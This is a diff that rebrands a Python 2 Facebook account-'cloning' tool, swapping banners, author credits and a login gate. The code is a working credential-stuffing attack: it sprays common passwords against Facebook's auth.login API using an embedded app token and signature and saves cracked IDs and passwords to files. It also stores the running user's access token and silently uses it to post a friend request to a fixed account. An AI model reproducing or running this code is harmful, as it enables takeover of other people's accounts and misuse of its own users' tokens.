@@ -49,12 +49,26 @@ def jalan(z):
 #### LOGO ####
 logo = """
 
-🆂🅰🅽🅹🅸🅳
-🆂🅰🅽🅹🅸🅳
-🆂🅰🅽🅹🅸🅳
-🆂🅰🅽🅹🅸🅳
-🆂🅰🅽🅹🅸🅳
+░░░░░██╗░█████╗░██╗░░██╗███████╗██████╗░
+░░░░░██║██╔══██╗██║░██╔╝██╔════╝██╔══██╗
+░░░░░██║██║░░██║█████═╝░█████╗░░██████╔╝
+██╗░░██║██║░░██║██╔═██╗░██╔══╝░░██╔══██╗
+╚█████╔╝╚█████╔╝██║░╚██╗███████╗██║░░██║
+░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
+ ♨️°───────(M-Asim_CH)───────°♨️ 
+\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
+\033[1;96m║✯ Creator ✯ M-Asim_CH          ║ 
+
+\033[1;92m║✯ Instagram ✯ masim617         ║    
+
+\033[1;94m║✯ Channel ✯ Asim Pardasi       ║   
+
+\033[1;97m║✯ Channel ✯ Asim Extra         ║ 
+
+\033[1;91m║✯ Facebook ✯ M Asim            ║ 
+\033[1;96m║✯ I'm Not Responsible For Any Miss Use║
+\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -72,12 +86,22 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m*******
-\033[1;96m~ ABAL ER ABBU SANJID SANNY 
-\033[1;97m*******
+\033[1;97m************************************************
+\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR Aaim ~
+\033[1;97m************************************************
 
-CorrectUsername = "sanjid"
-CorrectPassword = "sanjid"
+\033[1;96m███╗░░░███╗░█████╗░███╗░░██╗ New Update 0.9•✓
+\033[1;96m████╗░████║██╔══██╗████╗░██║
+\033[1;96m██╔████╔██║███████║██╔██╗██║
+\033[1;96m██║╚██╔╝██║██╔══██║██║╚████║
+\033[1;96m██║░╚═╝░██║██║░░██║██║░╚███║
+\033[1;96m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+ Enjoy Karo Mary Hoty Howy😎⚡😎
+ 🔥Jo Marzi karlo Tum Asim nahin Ban sakte🔥
+"""
+
+CorrectUsername = "Subscribe"
+CorrectPassword = "Ok1170"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -89,6 +113,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
+            os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+    else:
+        print "\033[1;96mWrong Username"
+        os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
 
 def login():
 	os.system('clear')
@@ -99,7 +127,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[⚡] \x1b[1;91m───Login your Baler ID───\x1b[1;93m[⚡]' )
+		print('\033[1;96m[⚡] \x1b[1;91m───Login your new ID───\x1b[1;93m[⚡]' )
 		id = raw_input('\033[1;93m[+] \x1b[0;34mEnter ID/Email \x1b[1;95m: \x1b[1;95m')
 		pwd = raw_input('\033[1;95m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
 		tik()
@@ -129,7 +157,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open
+				os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -271,7 +299,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m◄══════════════════CH══════════════════►"
 
-	jalan('          \033[1;91mstart cloning Wait...')
+	jalan('          \033[1;91mAsim start cloning Wait...')
 	print  "  \033[1;92m ◄══════════════════SANJID══════════════════►" 
 
 	def main(arg):
@@ -350,7 +378,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = '143143'										
+						           pass4 = 'indian'										
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -371,8 +399,8 @@ def pilih_super():
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
-					                           else:									
-						                       pass5 = 'Pubglover'							
+					                           else:								
+						                       pass5 = '007007'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -394,7 +422,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'indian'											
+							                           pass6 = '143143'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -494,7 +522,29 @@ def pilih_super():
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Asim.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
-        
+         ┈┈┈╲┈┈┈┈╱┈┈┈
+
+                 ┈┈┈╱▔▔▔▔╲┈┈┈
+                       I
+                 ┈┈┃┈▇┈┈▇┈┃┈┈┈
+
+                 ╭╮┣━━━━━━┫╭╮
+                       💓
+                 ┃┃┃┈┈┈┈┈┈┃┃┃
+         
+                 ╰╯┃┈┈┈┈┈┈┃╰╯
+                       U
+                 ┈┈╰┓┏━━┓┏╯┈┈
+
+                 ┈┈┈╰╯┈┈╰╯┈┈┈
+
+
+         Checkpoint ID Open After 7 Days
+•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
+: \033[1;91m ..Sanjid CH Creations.. \033[1;95m :
+•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
+                Instagram
+              \033[1;91masimch617"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
